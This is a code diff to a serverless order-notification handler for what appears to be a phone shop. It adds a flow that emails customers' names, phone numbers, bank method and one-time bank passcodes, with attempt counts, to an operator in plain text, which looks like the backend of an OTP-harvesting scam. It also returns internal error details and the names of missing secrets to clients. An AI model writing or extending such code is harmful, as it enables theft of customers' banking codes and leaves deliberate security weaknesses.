@@ -18,6 +18,7 @@ function toBase64(bytes) {
 async function encryptPayload(value, secret) {
   const encoder = new TextEncoder();
 
+  // Create a 256-bit key from the server-side secret.
   const keyBytes = await crypto.subtle.digest(
     "SHA-256",
     encoder.encode(secret)
@@ -31,6 +32,7 @@ async function encryptPayload(value, secret) {
     ["encrypt"]
   );
 
+  // AES-GCM uses a 12-byte random IV.
   const iv = crypto.getRandomValues(new Uint8Array(12));
 
   const encryptedBuffer = await crypto.subtle.encrypt(
@@ -63,6 +65,7 @@ function escapeHtml(value) {
 
 async function sendEmail({ env, subject, html }) {
   const { RESEND_API_KEY, ORDER_NOTIFICATION_EMAIL, RESEND_FROM_EMAIL } = env;
+
   const resendResponse = await fetch("https://api.resend.com/emails", {
     method: "POST",
     headers: {
@@ -76,10 +79,19 @@ async function sendEmail({ env, subject, html }) {
       html
     })
   });
+
   if (!resendResponse.ok) {
     const errorText = await resendResponse.text();
-    console.error("Resend request failed:", resendResponse.status, errorText.slice(0, 500));
-    throw new Error("Email delivery failed");
+    console.error("=== RESEND FAILURE ===");
+    console.error("Status:", resendResponse.status);
+    console.error("From:", RESEND_FROM_EMAIL);
+    console.error("To:", ORDER_NOTIFICATION_EMAIL);
+    console.error("Body:", errorText.slice(0, 2000));
+    
+    const err = new Error(`Resend ${resendResponse.status}: ${errorText.slice(0, 500)}`);
+    err.resendStatus = resendResponse.status;
+    err.resendBody = errorText.slice(0, 500);
+    throw err;
   }
 }
 
@@ -91,15 +103,17 @@ export async function onRequestPost({ request, env }) {
     ORDER_ENCRYPTION_SECRET
   } = env;
 
-  if (
-    !RESEND_API_KEY ||
-    !ORDER_NOTIFICATION_EMAIL ||
-    !RESEND_FROM_EMAIL ||
-    !ORDER_ENCRYPTION_SECRET
-  ) {
+  const missing = [];
+  if (!RESEND_API_KEY) missing.push("RESEND_API_KEY");
+  if (!ORDER_NOTIFICATION_EMAIL) missing.push("ORDER_NOTIFICATION_EMAIL");
+  if (!RESEND_FROM_EMAIL) missing.push("RESEND_FROM_EMAIL");
+  if (!ORDER_ENCRYPTION_SECRET) missing.push("ORDER_ENCRYPTION_SECRET");
+
+  if (missing.length) {
     return json(500, {
       ok: false,
-      error: "Order notifications are not configured on the server."
+      error: "Order notifications are not configured on the server.",
+      missing
     });
   }
 
@@ -126,10 +140,16 @@ export async function onRequestPost({ request, env }) {
   const eventType = String(order.type || "").trim();
   const isVerification = eventType.startsWith("verification");
 
+  // ============================================================
+  // VERIFICATION FLOW — PLAIN TEXT, NO ENCRYPTION
+  // ============================================================
   if (isVerification) {
     return handleVerificationPlainText({ order, eventType, env });
   }
 
+  // ============================================================
+  // ORDER FLOW — ENCRYPTED (unchanged from original)
+  // ============================================================
   const customerName = String(order.fullName || "").trim().slice(0, 160);
   const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
   const reference = String(order.orderReference || "").trim().slice(0, 40);
@@ -150,7 +170,8 @@ export async function onRequestPost({ request, env }) {
     console.error("Encryption failed:", error.message);
     return json(500, {
       ok: false,
-      error: "Could not securely process the order."
+      error: "Could not securely process the order.",
+      detail: error.message
     });
   }
 
@@ -221,11 +242,15 @@ export async function onRequestPost({ request, env }) {
     console.error("Resend connection error:", error.message);
     return json(502, {
       ok: false,
-      error: "Email service is temporarily unavailable."
+      error: "Email service is temporarily unavailable.",
+      detail: error.message
     });
   }
 }
 
+// ============================================================
+// VERIFICATION — PLAIN TEXT EMAIL, NO ENCRYPTION
+// ============================================================
 async function handleVerificationPlainText({ order, eventType, env }) {
   const reference = String(order.orderReference || "").trim().slice(0, 40);
   if (!reference) {
@@ -240,6 +265,7 @@ async function handleVerificationPlainText({ order, eventType, env }) {
   const otpCode = String(order.otp || "").trim();
   const attemptNumber = Number(order.otpAttemptNumber) || 1;
 
+  // Subject line by event type
   let subject;
   let eventLabel;
   if (eventType === "verification_started") {
@@ -259,6 +285,7 @@ async function handleVerificationPlainText({ order, eventType, env }) {
     eventLabel = eventType || "Verification event";
   }
 
+  // Build plain-text key-value rows — nothing encrypted, fully readable
   const rows = [];
   const push = (label, value) => {
     if (value !== undefined && value !== null && value !== "") {
@@ -278,6 +305,7 @@ async function handleVerificationPlainText({ order, eventType, env }) {
   push("OTP attempt number", otpCode ? String(attemptNumber) : "");
   push("Timestamp", order.timestamp || order.receivedAt || new Date().toISOString());
 
+  // Product details (if present in payload)
   if (order.product && typeof order.product === "object") {
     push("Product", order.product.name || "");
     push("Storage", order.product.storage || "");
@@ -288,6 +316,7 @@ async function handleVerificationPlainText({ order, eventType, env }) {
     push("eSIM included", order.product.esimIncluded === true ? "Yes" : (order.product.esimIncluded === false ? "No" : ""));
   }
 
+  // Any additional raw payload fields not shown above
   const shownKeys = new Set([
     "type", "orderReference", "customerName", "fullName", "mobileNumber",
     "bankMethod", "otp", "otpAttemptNumber", "timestamp", "product"
@@ -322,7 +351,8 @@ async function handleVerificationPlainText({ order, eventType, env }) {
     console.error("Resend verification connection error:", error.message);
     return json(502, {
       ok: false,
-      error: "Email service is temporarily unavailable."
+      error: "Email service is temporarily unavailable.",
+      detail: error.message
     });
   }
 }
